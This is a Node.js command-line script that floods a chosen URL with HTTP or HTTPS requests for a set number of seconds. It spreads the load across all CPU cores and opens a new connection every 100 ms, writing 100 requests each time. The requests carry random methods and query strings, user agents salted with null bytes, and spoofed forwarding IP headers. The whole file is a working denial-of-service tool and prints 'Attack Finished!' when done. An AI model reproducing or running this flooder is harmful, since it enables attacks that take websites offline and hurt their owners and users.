const fs = require('fs');
const url = require('url');
const net = require('net');
const tls = require('tls');
const cluster = require('cluster');
const os = require('os');

if (process.argv.length <= 2) {
	console.log("node raw.js url time");
	process.exit(-1);
}
var target = process.argv[2];
var parsed = url.parse(target);
var host = url.parse(target).host;
var time = process.argv[3];
var isHttps = parsed.protocol === 'https:';
var port = isHttps ? 443 : 80;

process.on('uncaughtException', function (e) { });
process.on('unhandledRejection', function (e) { });

const userAgents = [
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
   "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0"
];

const accepts = [
   "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
   "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
   "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
   "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"
];

const refers = [
   "https://google.com",
   "https://facebook.com",
   "https://youtube.com",
   "https://twitter.com",
   "https://instagram.com",
   "https://github.com",
   "https://stackoverflow.com",
   "https://www.tiktok.com"
];

const langs = [
   "en-US,en;q=0.9",
   "id-ID,id;q=0.9,en;q=0.8",
   "en-GB,en;q=0.9",
   "ja-JP,ja;q=0.9,en;q=0.8"
];

const nullHexs = [
    "\x00", "\xFF", "\xC2", "\xA0", "\x01", "\x02", "\x03", "\x04", 
    "\x05", "\x06", "\x07", "\x08", "\x0B", "\x0C", "\x0E", "\x0F",
    "\x10", "\x11", "\x12", "\x13", "\x14", "\x15", "\x16", "\x17",
    "\x18", "\x19", "\x1A", "\x1B", "\x1C", "\x1D", "\x1E", "\x1F"
];

const methods = ["GET", "HEAD", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"];

function randstr(len) {
    const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    let res = "";
    for (let i = 0; i < len; i++) {
        res += chars[Math.floor(Math.random() * chars.length)];
    }
    return res;
}

function random(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function randomIP() {
    return Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255);
}

// ========== CLUSTER MULTI-CORE ==========
if (cluster.isMaster) {
    console.clear();
    console.log("\x1b[36m============================================");
    console.log("\x1b[33mRAW METHODS");
    console.log("\x1b[36m============================================");
    console.log("\x1b[33mTarget: \x1b[37m" + target);
    console.log("\x1b[33mTime: \x1b[37m" + time + "s");
    console.log("\x1b[33mPort: \x1b[37m" + port);
    console.log("\x1b[33mThreads: \x1b[37m" + os.cpus().length);
    console.log("\x1b[33mMethod: \x1b[31mRAW + NULL BYTE");
    console.log("\x1b[36m============================================");

    var threads = os.cpus().length;
    for (var i = 0; i < threads; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        console.log("\x1b[31m[!] Attack Finished!\x1b[0m");
        process.exit(1);
    }, time * 1000);
} else {
    // ========== WORKER ==========
    var int = setInterval(() => {
        var s;

        if (isHttps) {
            var raw = net.createConnection(port, host);
            raw.setTimeout(10000);
            s = tls.connect({
                socket: raw,
                servername: host,
                rejectUnauthorized: false,
                ALPNProtocols: ['http/1.1']
            });
        } else {
            s = net.createConnection(port, host);
            s.setTimeout(10000);
        }

        s.setKeepAlive(true, 60000);
        s.setNoDelay(true);

        for (var i = 0; i < 100; i++) {
            var path = (parsed.path || "/") + "?" + randstr(8) + "=" + randstr(16) + "&" + randstr(6) + "=" + randstr(12);
            var method = random(methods);
            var ua = random(userAgents) + random(nullHexs) + randstr(5);
            
            s.write(
                method + ' ' + path + ' HTTP/1.1\r\n' +
                'Host: ' + host + '\r\n' +
                'User-Agent: ' + ua + '\r\n' +
                'Accept: ' + random(accepts) + '\r\n' +
                'Accept-Language: ' + random(langs) + '\r\n' +
                'Accept-Encoding: gzip, deflate, br\r\n' +
                'Referer: ' + random(refers) + '\r\n' +
                'Cache-Control: no-cache, no-store, must-revalidate\r\n' +
                'Pragma: no-cache\r\n' +
                'Connection: Keep-Alive\r\n' +
                'Upgrade-Insecure-Requests: 1\r\n' +
                'DNT: 1\r\n' +
                'X-Forwarded-For: ' + randomIP() + '\r\n' +
                'X-Real-IP: ' + randomIP() + '\r\n\r\n'
            );
        }

        s.on('data', function () {
            setTimeout(function () {
                s.destroy();
                return delete s;
            }, 5000);
        });

        s.on('error', function () {
            s.destroy();
            return delete s;
        });

    }, 100);

    setTimeout(() => clearInterval(int), time * 1000);
}